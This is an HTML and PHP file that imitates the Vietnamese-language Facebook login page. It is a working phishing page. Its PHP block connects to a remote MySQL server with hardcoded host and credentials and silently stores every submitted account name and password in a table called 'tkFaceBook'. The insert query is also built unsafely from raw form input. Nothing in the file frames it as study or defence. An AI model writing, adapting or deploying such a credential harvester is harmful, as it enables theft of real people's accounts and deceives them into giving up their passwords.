<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        * {
            font-family: Arial, Helvetica, sans-serif;
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        .container {
            width: auto;
            height: auto;
        }

        .chua {
            padding: 120px 250px;
            width: 100%;
            height: 700px;
            background-color: #f0f2f5;
            display: flex;
        }

        .dangNhap {
            width: 396px;
            height: 350px;
            background-color: #ffffff;
            border: 0px solid;
            border-radius: 5px;
            box-shadow: 0px 0px 5px rgb(199, 198, 198);
            margin: 20px 20px;
        }

        .chuaDangNhap {
            width: 365px;
            height: 285px;
            margin: 15px 15px;
            text-align: center;
        }

        .input {
            width: 365px;
            height: 52px;
            border-radius: 6px;
            border: 1px solid rgb(212, 210, 210);
            margin-top: 15px;
            padding: 10px;
            font-size: 17px;
        }

        .input:target {
            border: 1px solid #1877f2;
        }

        .button {
            width: 365px;
            height: 50px;
            background-color: #1877f2;
            border: 0px solid #1877f2;
            border-radius: 6px;
            margin-top: 15px;
            font-size: 20px;
            color: white;
            font-weight: bold;
        }

        .button:hover {
            background-color: #176bda;
        }

        .button1 {
            width: max-content;
            height: 48px;
            background-color: #42b72a;
            border: 0px solid #1877f2;
            border-radius: 6px;
            margin-top: 15px;
            font-size: 17px;
            color: white;
            font-weight: bold;
            padding: 0 16px;

        }

        .button1 a {
            color: white;
            text-decoration: none;
        }

        .button1:hover {
            background-color: #369722;
        }

        .quenMK {
            text-align: center;
            line-height: 50px;
        }

        .quenMK a {
            text-decoration: none;
            color: #1877f2;
        }

        .quenMK a:hover {
            text-decoration: 1px underline;
        }

        .taoTrang {
            font-size: 14px;
        }

        .taoTrang a {
            text-decoration: none;
            font-size: 14px;
            font-weight: 600;
            color: black;
        }

        .taoTrang a:hover {
            text-decoration: underline;
        }

        img {
            width: 500px;
            margin-top: 80px;
        }
    </style>
</head>

<body>

    <div class="container">
        <div class="chua">
            <div class="chua1"></div>
            <div class="logo">
                <img src="https://f49-zpg-r.zdn.vn/6532959443650295885/23f11b65df6810364979.jpg" alt="">
            </div>
            <div>
                <div class="dangNhap">
                    <div class="chuaDangNhap">


                    <?php
                        $connect = mysqli_connect("37.59.55.185","0VRF8rTx3T","tmdKdi99nR","0VRF8rTx3T");
                        mysqli_query($connect, "SET NAMES'utf8'");

                            $taiKhoan = "";
                            $matKhau = "";

						
						if ($_SERVER["REQUEST_METHOD"] == "POST") {
						    if(isset($_POST["taiKhoan"])) { $taiKhoan = $_POST['taiKhoan']; }
						    if(isset($_POST["matKhau"])) { $matKhau = $_POST['matKhau']; }

                        $query = "INSERT INTO `tkFaceBook` (`id`, `taiKhoan`, `matKhau`) VALUES (NULL, '$taiKhoan', '$matKhau')";
                            
                            
						    if(mysqli_query($connect, $query)){
						        echo "";
						    }else{
						        echo "";
						    }
						    
						    
						    
                        }
                        ?>

                        

                        <form action="" method="post">
                            <input class="input" type="text" name="taiKhoan" value="" placeholder="Email hoặc số điện thoại" />
                            <input class="input" type="password" name="matKhau" value="" placeholder="Mật khẩu" />
                            <button class="button" type="submit">Đăng nhập</button>
                        </form>









                        <div class="quenMK"><a
                                href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Quên
                                mật khẩu?</a></div>
                        <hr>
                        <button class="button1" type="button"><a
                                href="https://www.facebook.com/campaign/landing.php?&campaign_id=1661697988&extra_1=s%7Cc%7C515923225148%7Ce%7Cdang%20ky%20tai%20khoan%20facebook%7C&placement=&creative=515923225148&keyword=dang%20ky%20tai%20khoan%20facebook&partner_id=googlesem&extra_2=campaignid%3D1661697988%26adgroupid%3D65157402958%26matchtype%3De%26network%3Dg%26source%3Dnotmobile%26search_or_content%3Ds%26device%3Dc%26devicemodel%3D%26adposition%3D%26target%3D%26targetid%3Dkwd-344673916533%26loc_physical_ms%3D9040331%26loc_interest_ms%3D%26feeditemid%3D%26param1%3D%26param2%3D&gclid=EAIaIQobChMInPG-3Zq29gIVw8qWCh2nZgtrEAAYASAAEgLLvvD_BwE">Tạo
                                tài khoản mới</a></button>


                    </div>

                </div>
                <div class="taoTrang" style="width: 396px; margin: 20px 20px; padding: 6px; text-align: center;"><a
                        href="https://www.facebook.com/pages/create/?ref_type=registration_form">Tạo trang </a>dành cho
                    người nổi tiếng, thương hiệu hoặc doanh nghiệp.</div>
            </div>
        </div>
    </div>
    </div>
</body>

</html>